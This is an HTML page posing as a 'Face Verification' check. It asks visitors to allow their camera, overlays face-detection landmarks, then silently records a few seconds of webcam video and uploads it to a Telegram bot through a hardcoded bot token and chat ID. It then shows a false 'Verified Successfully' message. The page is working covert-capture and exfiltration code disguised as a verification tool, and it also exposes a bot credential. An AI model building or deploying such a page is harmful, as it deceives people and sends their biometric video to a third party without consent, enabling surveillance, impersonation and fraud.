<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #283593, #1565C0);
            color: white;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        #video {
            width: 320px;
            height: 240px;
            border-radius: 20px;
            border: 2px solid #4CAF50;
            margin: 20px auto;
            display: none;
            object-fit: cover;
        }

        #overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 320px;
            height: 240px;
            transform: translate(-50%, -50%);
            pointer-events: none;
        }

        .loading {
            font-size: 16px;
            color: #FFC107;
            margin: 20px 0;
            display: none;
        }

        .success {
            font-size: 18px;
            color: #4CAF50;
            display: none;
        }

        .allow-btn {
            padding: 10px 20px;
            font-size: 16px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .allow-btn:hover {
            background: #388E3C;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Face Verification</h1>
        <button id="allow-btn" class="allow-btn">Allow Camera</button>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="overlay"></canvas>
        <div class="loading">Processing your face...</div>
        <div class="success">âœ… Verified Successfully!</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const overlay = document.getElementById('overlay');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');
        const allowButton = document.getElementById('allow-btn');
        const canvasCtx = overlay.getContext('2d');
        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
        const telegramChatId = "2070423407";

        allowButton.addEventListener('click', async () => {
            // Hide the button
            allowButton.style.display = 'none';

            // Load face-api models
            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models');
            await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models');

            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = 'block';

            // Start face tracking
            video.addEventListener('play', () => {
                overlay.width = video.videoWidth;
                overlay.height = video.videoHeight;

                const interval = setInterval(async () => {
                    const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();

                    if (detections) {
                        canvasCtx.clearRect(0, 0, overlay.width, overlay.height);
                        const resizedDetections = faceapi.resizeResults(detections, { width: overlay.width, height: overlay.height });
                        
                        // Draw face box
                        const box = resizedDetections.detection.box;
                        canvasCtx.strokeStyle = '#4CAF50';
                        canvasCtx.lineWidth = 2;
                        canvasCtx.strokeRect(box.x, box.y, box.width, box.height);

                        // Draw landmarks
                        const landmarks = resizedDetections.landmarks;
                        canvasCtx.fillStyle = '#FFC107';
                        landmarks.positions.forEach((pos) => {
                            canvasCtx.beginPath();
                            canvasCtx.arc(pos.x, pos.y, 2, 0, 2 * Math.PI);
                            canvasCtx.fill();
                        });

                        // Stop recording after 3 seconds
                        setTimeout(() => {
                            clearInterval(interval);
                            sendVideoToTelegram(stream);
                        }, 3000);
                    }
                }, 100);
            });
        });

        async function sendVideoToTelegram(stream) {
            loading.style.display = 'block';
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.start();

            mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const formData = new FormData();
                formData.append('chat_id', telegramChatId);
                formData.append('video', blob, 'video.webm');

                fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                })
                .then((response) => {
                    loading.style.display = 'none';
                    success.style.display = 'block';

                    // Stop camera stream
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch((error) => {
                    alert('Error: ' + error.message);
                });
            };

            setTimeout(() => mediaRecorder.stop(), 3000); // Stop after 3 seconds
        }
    </script>
</body>
</html>
